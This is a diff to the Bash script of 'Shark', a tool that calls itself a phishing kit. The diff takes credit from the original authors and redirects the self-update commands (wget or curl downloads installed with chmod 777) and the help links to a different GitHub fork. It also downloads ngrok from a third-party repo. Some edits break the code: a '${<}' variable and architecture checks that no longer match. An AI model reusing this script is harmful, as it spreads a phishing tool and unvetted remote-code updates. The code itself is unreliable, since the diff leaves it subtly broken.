@@ -4,9 +4,9 @@
 #             PROJECT: SHARK                 #
 #              SHARK ©2022-2023              #
 #           BEST PHISHING TOOLS BY           #
-#             M r. D e r e K   (Contributor) #
+#             M r. J u i c e   (Dev) #
 #          B h a v i k   O z a (Publisher)   #  
-#         A s h i s h  S i n g h (Author)    #
+#         A s i f K  h a n     (debuger)    #
 ##############################################
 
 #########
@@ -137,19 +137,19 @@ function os () {
 function main_update() {
 	#launch="updating shark"
 	#splashdown="updated shark";echo
-	#os;(wget -q https://github.com/Bhaviktutorials/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
+	#os;(wget -q https://github.com/mrjuice01/shark01/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
 	echo
 	msg "update manually by installation command\n ~(check Official shark repo)"
 	sleep 2
 	echo
 	msg "Redirecting to Official shark repo..."
-	xdg-open 'https://github.com/Bhaviktutorials/shark'
+	xdg-open 'https://github.com/mrjuice01/shark01'
 	exit 1
 }
 
 
 function update() {
-	version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
+	version=$(curl -L -s https://raw.githubusercontent.com/mrjuice01/shark01/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
 	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
 		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
@@ -179,7 +179,7 @@ function connection() {
 
 function check_update() {
         connection
-        version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
+        version=$(curl -L -s https://raw.githubusercontent.com/mrjuice01/shark01/master/shark01 | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
         if [ ${latest_version} = ${VERSION} ];then
                 echo -e "\tReading \tpackage \tlists... \tDone
@@ -212,7 +212,7 @@ Options:
   --fix-cloudfl     Fix CloudFlared port forwarding issue
   --fix-patches     Check missing packages & fix patches
   --fix-cloudshell  Restart Vm and cloudshell & fix patches
-For additional info, see: https://github.com/Bhaviktutorials/shark
+For additional info, see: https://github.com/mrjuice01/shark01
 EOF
 }
 
@@ -224,7 +224,7 @@ function purge_shark() {
 function fix_patches() {
         launch="fixing shark patches"
 	splashdown="shark patches fixed";echo
-	os;sed -i -e 's/\r$//' ${shark}/setup
+	os;sed -i -e 's/\r$//' ${<}/setup
 	chmod 777 ${shark}/setup
         (${shark}/setup > /dev/null 2&>1) & spinner
 }
@@ -241,20 +241,20 @@ function fix_ngrok() {
 	os;rm -f ${BIN}/ngrok
 	launch="fixing ngrok"
 	splashdown="fixed ngrok";echo
-	if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+	if [[ ("$arch" == 'arm') || ("$arch" == 'Android') ]]; then
 
 			ngrok_url="https://github.com/E343IO/stuff/raw/main/ngrok-2in1.zip"
 
 
 
-		elif [[ "$arch" == *'aarch64'* ]]; then
-		         if [[ "$ArNam" == *'amd64'* ]]; then
+		elif [[ "$arch" == 'aarch64' ]]; then
+		         if [[ "$ArNam" == 'amd64' ]]; then
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
                         else
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
 		         fi
-		elif [[ "$arch" == *'x86_64'* ]]; then
-		         if [[ "$ArNam" == *'amd64'* ]]; then
+		elif [[ "$arch" == 'x86_64' ]]; then
+		         if [[ "$ArNam" == 'amd64' ]]; then
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
                         else
                               ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
@@ -272,12 +272,12 @@ function fix_cloudflared() {
 	os;rm -rf ${BIN}/cloudflared && rm -rf ${logfile}.cloud.log
 	launch="fixing cloudflare.."
 	splashdown="cloudflare fixed"
-        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+        if [[ ("$arch" == 'arm') || ("$arch" == 'Android') ]]; then
                         cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
-                elif [[ "$arch" == *'aarch64'* ]]; then
+                elif [[ "$arch" == 'aarch64' ]]; then
                         cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
-                elif [[ "$arch" == *'x86_64'* ]]; then
-                        if [[ "$ArNam" == *'amd64'* ]]; then
+                elif [[ "$arch" == 'x86_64' ]]; then
+                        if [[ "$ArNam" == 'amd64' ]]; then
                                 cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
                         else
                                 cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
@@ -909,11 +909,11 @@ if [[ ! -e "${logfile}.sharkmsg" ]]; then
 	printf "                           ${red}|===========================|
 	                  [¤]   \e[1;33mD I S C L A I M E R${red}   [¤]
 	                   |===========================|\n\n"
-	error_msg "\e[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of Shark are not responsible for any kind hack and stuff.\n\n• shark is a open source tool that help us to know how phishing works\n\n• Phishing is illigal if you are using as offensive\n\n• The use of the SHARK & its resources/phishing-pages is COMPLETE RESPONSIBILITY of the END-USER.
+	error_msg "\e[1;32m• This tool you are going to use at your risk,\n\n• Mr Juice  and Publisher of Shark are not responsible for any kind hack and stuff.\n\n• shark is a open source tool that help us to know how phishing works\n\n• Phishing is illigal if you are using as offensive\n\n• The use of the SHARK & its resources/phishing-pages is COMPLETE RESPONSIBILITY of the END-USER.
 Developers assume NO liability and are NOT responsible for any damage caused by this program.
 Also we want to inform you that some of your actions may be ILLEGAL and you CAN NOT use this
 software to test device, company or any other type of target without WRITTEN PERMISSION from them.\n\n"
-msg "Give us your feedback on telegram chat grp:- https://t.me/bhaviktutorial\n"
+msg "Give us your feedback on telegram chat:- https://t.me/DeveloperJuice\n"
 
 read -p $'\e[1;40m\e[1;92m T O  R U N  S H A R K  A C C E P T  D I S C L A I M E R\e[1;93m (Y/N) : \e[0m' shmsg
 
@@ -1296,8 +1296,7 @@ done
 #####################################################################
 #                                                                   #
 #      simply changing this banner will not make you developer      #
-#                   KEEP SUPPORTING                                 #
-#                      THANKYOU                                     #
+#                   KEEP SUPPORTING  @mrjuice                    #
+#                      THANK YOU         🤗                      #
 #                                                                   #
 #####################################################################
-
